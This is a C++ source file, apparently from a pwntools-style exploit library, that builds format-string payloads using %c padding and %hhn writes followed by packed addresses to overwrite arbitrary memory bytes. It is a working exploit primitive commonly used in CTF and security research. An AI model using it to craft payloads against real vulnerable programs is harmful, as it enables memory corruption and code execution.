#include <libpwntools/fmtstr.h>
#include <libpwntools/utils.h>
#include <iostream>

bool sortcmp(const std::pair<int,int> &a, const std::pair<int,int> &b) {
    return (a.second < b.second);
}

fmtstr_payload::fmtstr_payload(uint32_t offset) {
    this->offset = offset;
    this->padding = 0;
    this->set_bytes_written(0);
}

void fmtstr_payload::do_write(uint64_t addr, uint64_t value) {
    for(int i=0; i < 8; ++i) {
        this->list.push_back({addr + i, value & 0xff});
        value >>= 8;
    }
}

void fmtstr_payload::set_bytes_written(size_t n) {
    this->bytes_written = n;
    if(n)
        this->padding = 8 - (n % 8);
}

std::string fmtstr_payload::build() {
    std::string payload;
    uint64_t written = this->bytes_written + this->padding;
    uint64_t payload_size = this->list.size() * 12;
    payload_size = payload_size + 0x10 - (payload_size % 8);

    uint64_t pos = this->offset + (written + payload_size)/8;
    std::sort(this->list.begin(), this->list.end(), sortcmp);

    for(auto iter : this->list) {
        uint64_t value = iter.second;
        if(value != (written & 0xff)) {
            uint64_t len = (value - written) & 0xff;
            payload += "%" + std::to_string(len) + "c";
            written += len;
        }
        payload += "%" + std::to_string(pos++) + "$hhn";
    }

    payload += std::string(payload_size-payload.length(), '|');
    for(auto iter : this->list)
        payload += std::string((char *)&iter.first, 8);

    return payload;
}
